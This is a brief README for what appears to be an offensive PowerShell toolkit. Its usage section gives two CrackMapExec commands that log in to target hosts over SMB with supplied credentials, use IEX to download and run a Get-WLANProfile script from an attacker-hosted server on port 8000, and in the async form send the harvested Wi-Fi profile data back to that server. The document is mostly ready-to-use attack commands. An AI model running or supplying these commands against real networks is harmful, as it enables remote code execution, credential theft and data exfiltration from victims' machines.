# PSTools (WIP)

## Usage

ASYNC EXEC:

```cme smb $TARGETS -u $USER$ -p $PASSWORD$ -X "IEX (new-object net.webclient).downloadstring('http://$IP:8000/Get-WLANProfile.ps1'); Get-WLANProfile -AsyncURI http://$IP:8000;" --no-output```

SYNC EXEC:

```cme smb $TARGETS -u $USER$ -p $PASSWORD$ -X "IEX (new-object net.webclient).downloadstring('http://$IP:8000/Get-WLANProfile.ps1'); Get-WLANProfile;"```

## Acknowledgments
* @neosysforensics for his guide and help
* I copied and modified some scripts from here: https://github.com/BornToBeRoot/PowerShell
